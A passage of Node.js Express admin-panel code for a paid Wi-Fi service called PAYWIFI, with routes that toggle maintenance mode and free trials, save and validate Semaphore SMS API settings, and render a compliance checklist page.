    flash(req, 'ok', 'Maintenance mode enabled (' + validMode + ').');
  } else {
    upsert('maintenance_contact_email',     String(contact_email      || '').slice(0, 200));
    upsert('maintenance_contact_messenger', String(contact_messenger  || '').slice(0, 300));
    upsert('maintenance_enabled', '0');
    audit(req.admin.id, 'maintenance_disable', null, req.clientIp);
    flash(req, 'ok', 'Maintenance mode disabled.');
  }
  res.redirect('/admin/maintenance');
});

// Legacy free-trial routes (GET /free-trial, POST /free-trial/reset-today) removed as
// dead code — superseded by routes/adminUi-freetrial.js, mounted earlier and shadowing them.
// (POST /free-trial/toggle below is currently also shadowed by that router's /free-trial/:id.)
router.post('/free-trial/toggle', (req, res) => {
  const val = req.body.ft_enabled;
  const enabled = (val === '1' || (Array.isArray(val) && val.includes('1'))) ? '1' : '0';
  const now     = Math.floor(Date.now() / 1000);
  const ex = db.prepare("SELECT key FROM settings WHERE key='free_trial_enabled'").get();
  if (ex) db.prepare("UPDATE settings SET value=?,updated_at=? WHERE key='free_trial_enabled'").run(enabled, now);
  else     db.prepare("INSERT INTO settings (key,value,updated_at) VALUES ('free_trial_enabled',?,?)").run(enabled, now);
  audit(req.admin.id, 'free_trial_toggle', enabled, req.clientIp);
  flash(req, 'ok', 'Free Trial ' + (enabled === '1' ? 'enabled' : 'disabled') + '.');
  res.redirect('/admin/free-trial');
});


// ---- SMS Module ------------------------------------------------------------
router.get('/sms', (req, res) => {
  const settings = db.prepare('SELECT key, value FROM settings').all();
  const semKey    = (settings.find(s => s.key === 'semaphore_api_key')    || {}).value || '';
  const semSender = (settings.find(s => s.key === 'semaphore_sender_name') || {}).value || 'PAYWIFI';

  // Ensure semaphore settings exist in DB
  const now = Math.floor(Date.now() / 1000);
  [['semaphore_api_key',''], ['semaphore_sender_name','PAYWIFI']].forEach(([k, def]) => {
    const ex = db.prepare('SELECT key FROM settings WHERE key=?').get(k);
    if (!ex) db.prepare('INSERT INTO settings (key,value,updated_at) VALUES (?,?,?)').run(k, def, now);
  });

  render(res, 'sms', {
    title: 'SMS Module · PAYWIFI',
    active: 'sms',
    semKey,
    semSender,
  });
});

router.post('/sms', async (req, res) => {
  const now    = Math.floor(Date.now() / 1000);
  const apiKey = (req.body.semaphore_api_key    || '').trim();
  const sender = (req.body.semaphore_sender_name || '').trim();

  // Upsert both keys
  for (const [k, v] of [['semaphore_api_key', apiKey], ['semaphore_sender_name', sender]]) {
    const ex = db.prepare('SELECT key FROM settings WHERE key=?').get(k);
    if (ex) db.prepare('UPDATE settings SET value=?,updated_at=? WHERE key=?').run(v, now, k);
    else    db.prepare('INSERT INTO settings (key,value,updated_at) VALUES (?,?,?)').run(k, v, now);
  }
  audit(req.admin.id, 'sms_settings_update', 'sender=' + sender, req.clientIp);

  // B-06: Validate sender name against Semaphore account if API key provided
  if (apiKey) {
    try {
      const https = require('https');
      const acctData = await new Promise((resolve, reject) => {
        const url = `https://api.semaphore.co/api/v4/account?apikey=${encodeURIComponent(apiKey)}`;
        https.get(url, (r) => {
          let body = '';
          r.on('data', c => body += c);
          r.on('end', () => { try { resolve(JSON.parse(body)); } catch(e) { resolve(null); } });
        }).on('error', reject);
      });
      if (acctData && acctData.error) {
        flash(req, 'err', 'SMS settings saved, but Semaphore API key appears invalid: ' + acctData.error);
      } else if (acctData && sender && acctData.sendername && String(acctData.sendername).toLowerCase() !== sender.toLowerCase()) {
        flash(req, 'warn', `SMS settings saved. Note: your account default sender is "${acctData.sendername}" — the name you entered may not be registered.`);
      } else {
        flash(req, 'ok', 'SMS settings saved and verified with Semaphore ✓');
      }
    } catch (e) {
      flash(req, 'ok', 'SMS settings saved. (Could not reach Semaphore for validation — check connectivity.)');
    }
  } else {
    flash(req, 'ok', 'SMS settings saved.');
  }

  res.redirect('/admin/sms');
});


// ── Compliance / Regulatory Checklist ───────────────────────────────────────
router.get('/compliance', (req, res) => {
  render(res, 'compliance', {
    title: 'Compliance · PAYWIFI',
    active: 'compliance',
  });
});

module.exports = router;
